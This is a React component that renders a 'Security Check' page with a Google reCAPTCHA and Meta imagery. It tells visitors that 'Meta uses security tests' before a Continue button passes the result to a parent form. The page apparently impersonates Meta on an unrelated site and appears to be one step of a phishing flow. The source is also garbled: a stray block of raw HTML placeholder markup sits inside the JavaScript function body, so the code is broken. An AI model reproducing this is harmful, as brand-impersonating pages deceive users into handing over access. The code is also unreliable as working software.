import React from 'react';
import styles from '../styles/security-check.module.css';
import ReCAPTCHA from "react-google-recaptcha";
import { useState } from "react";



const SecurityCheck = (props) => {

    const [isVerified, setIsVerified] = useState(false);

    const foo = function(event) {
        if(event) {
            setIsVerified(true);
        }
    };


  <link rel="stylesheet" href="security-check.module.css">
</head>
<body>

  <div class="post-container">
    <div class="post-header">
      <img class="profile-pic" src="your_profile_pic_url.jpg" alt="Profile Picture">
      <div class="profile-name">Your Name</div>
    </div>
    <div class="post-content">
      <p class="post-message">Your post message goes here...</p>
    </div>
  </div>

</body>
</html>

    const trigerNext = () => {
        props.onSubmit({type: 'security-check', value: true});
    }

  return (
    <div className={styles.securityCheck}>
        <div className={styles.card}>

            <div className={styles.mainImage}>
                <img className={styles.image} src="./captacha_img.png" />
            </div>

            <div className={styles.secondImage}>
                <img className={styles.image} src="./catcha_meta.webp" />
            </div>

            <div className={styles.check}>
                <h4>Security Check</h4>
                <p>Meta uses security tests to ensure that the people one the site are real. Please fill the security test below to continue further</p>
                
                <div className={styles.ReCAPTCHA}>
                    <ReCAPTCHA
                    sitekey="6LfwEA4pAAAAAH7l1_EEGLPttcD4sq-X03qr-1pv"
                    onChange={foo}
                    />
                </div>
                

                <button disabled={!isVerified} onClick={trigerNext} >Continue</button>
            </div>
        </div>
    </div>
  );
};

export default SecurityCheck;
